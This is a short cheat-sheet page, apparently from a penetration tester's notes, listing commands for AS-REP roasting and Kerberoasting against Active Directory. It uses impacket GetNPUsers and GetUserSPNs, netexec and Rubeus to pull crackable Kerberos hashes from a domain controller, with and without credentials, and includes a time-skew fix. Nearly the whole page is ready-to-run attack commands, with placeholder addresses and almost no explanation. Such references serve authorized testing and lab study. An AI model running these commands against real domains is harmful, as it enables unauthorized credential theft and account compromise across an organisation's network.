---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
---

---
### AS_REP Roasting

```bash
# Multiple valid usernames
impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
```

```bash
# Multiple valid usernames (nxc)
nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt
```

```bash
# Single user without creds
impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user
```

### Kerberoasting

#### From Linux

```bash
# Fix time skew
sudo ntpdate -s 10.10.11.10 && impacket-GetUserSPNs -request 'example.com/username:password' -dc-ip 10.10.11.10
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

```bash
# Kerberoasting without cred
sudo ntpdate -s 10.10.11.10 && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile usernames.txt -dc-host 10.10.11.10 <DOMAIN>/
```

#### From Windows

```cmd
.\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password
```

<br>